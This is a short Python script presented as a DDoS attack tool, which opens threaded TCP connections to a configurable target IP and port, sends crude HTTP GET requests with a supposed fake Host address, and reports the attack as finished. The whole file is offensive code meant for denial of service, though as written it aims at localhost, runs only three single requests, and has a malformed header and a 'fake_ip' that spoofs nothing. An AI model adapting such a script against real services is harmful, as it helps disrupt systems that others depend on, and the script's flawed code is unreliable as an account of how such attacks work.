#main

import socket 
import threading

target_ip = "127.0.0.1"
target_port = 80

thread_count = 3

fake_ip = "127.0.0.1"

def ddos():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))
    
    client.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode("ascii"), (target_ip, target_port))
    client.sendto(("Host" + fake_ip + "\r\n\r\n").encode("ascii"), (target_ip, target_port))
    client.close()
    
threads = []

for i in range(thread_count):
    thread = threading.Thread(target=ddos)
    threads.append(thread)
    thread.start()
    

for thread in threads:
    thread.join()
    
print ("DDos attack finished")